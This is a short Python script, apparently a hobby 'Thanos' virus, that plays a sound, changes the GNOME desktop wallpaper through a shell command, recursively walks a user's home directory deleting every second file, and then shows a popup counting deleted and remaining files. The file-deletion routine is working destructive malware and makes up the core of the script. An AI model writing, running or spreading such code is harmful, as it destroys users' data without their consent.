import tkinter as tk
import os
import asyncio
import time
from playsound import playsound

username = os.getlogin()


bg = [
    "wallpaper1.jpeg",
    "wallpaper2.jpeg",
    "wallpaper3.jpg"
]

scanned_files = 0
deleted_files = 0

def popUp():
    root = tk.Tk()
    root.configure(background="black")

    #To disable the menu
    root.overrideredirect(True)

    width, height = root.winfo_screenwidth(), root.winfo_screenheight()
    x = 990 - 500/2
    y = 500 - 50/2
    root.geometry('500x50+%d+%d' % (x, y))

    frame = tk.Frame(root, width=500, height=50, bg='black')
    frame.grid(row=0, column=0, sticky="NW")

    font = ("Arial", 20, "bold")

    label = tk.Label(root, text='deleted: %d       left: %d' % (deleted_files, scanned_files-deleted_files), bg='black', fg='white', font= font)
    label.place(relx=0.5, rely=0.5, anchor="center")

    #label.pack()
    root.mainloop()

def wallpaper(number):
    os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/"+ username +"/virus/" + bg[number])

def bgSound():
    playsound('bgSound.mp3',0)


async def thanos(dossier, delete_count = 0):
    
    global deleted_files
    global scanned_files

    for nom_fichier in os.listdir(dossier):
        if nom_fichier != 'virus':
            path_file = os.path.join(dossier, nom_fichier);
            if os.path.isdir(nom_fichier):
                await thanos(path_file, delete_count)
            else:
                if delete_count % 2 == 0:
                    try:
                        # os.chmod(path_file, 0o644)
                        os.remove(path_file)
                        deleted_files += 1
                        print('delete ' + path_file)
                    except:
                        print('Mixmax')
                scanned_files += 1
                delete_count += 1


async def main():
    bgSound()
    wallpaper(0)
    task = asyncio.create_task(thanos('/home/snoopy'))
    await asyncio.sleep(5)
    wallpaper(1)
    await asyncio.sleep(5)
    await task
    wallpaper(2)
    popUp()

asyncio.run(main())

